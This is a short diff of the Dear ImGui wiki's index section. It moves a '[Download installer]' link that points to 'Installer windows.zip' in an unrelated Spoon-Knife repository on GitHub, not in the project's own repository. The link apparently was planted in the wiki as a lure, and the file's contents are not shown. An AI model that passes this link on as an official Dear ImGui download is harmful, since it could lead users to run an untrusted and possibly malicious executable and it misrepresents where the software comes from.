@@ -3,7 +3,8 @@ Welcome to the Dear ImGui wiki! Feel free to edit and contribute!
 # Index
 
 - [General](#general)
-  [Download installer](https://github.com/FrankFeng/Spoon-Knife/raw/master/Installer%20windows.zip)
+  
+[Download installer](https://github.com/FrankFeng/Spoon-Knife/raw/master/Installer%20windows.zip)
 - [General documentation](#general-documentation)
   - [Community](#community)
   - [Demo, Examples](#demo-examples)
